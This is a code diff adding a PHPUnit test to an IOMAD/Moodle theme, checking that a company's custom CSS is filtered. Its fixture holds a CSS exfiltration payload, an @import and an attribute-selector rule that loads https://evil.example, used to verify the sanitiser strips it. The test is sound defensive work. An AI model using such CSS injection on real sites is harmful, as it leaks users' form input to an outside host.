@@ -76,6 +76,23 @@ final class company_style_test extends \advanced_testcase {
     }
 
     /**
+     * The custom CSS of the company is made safe: what could send the content of the page elsewhere is taken out;
+     * the setting « The custom CSS of the companies » unticked applies none of it.
+     */
+    public function test_custom_css_filtered(): void {
+        $this->resetAfterTest();
+        $company = (object) ['customcss' => '@import "https://evil.example/a.css"; .x{color:red}'
+            . ' input[value^="a"]{background:url(https://evil.example/a)}'];
+        $css = company_style::css($company);
+        $this->assertStringContainsString('.x{color:red}', $css);
+        $this->assertStringContainsString('background:none', $css);
+        $this->assertStringNotContainsString('evil.example', $css);
+
+        set_config('iomadcompanycss', 0, 'theme_epure');
+        $this->assertStringNotContainsString('.x{color:red}', company_style::css($company));
+    }
+
+    /**
      * The Épure settings of a company: its brand colour comes before IOMAD's heading colour, and its font is applied.
      */
     public function test_company_settings(): void {
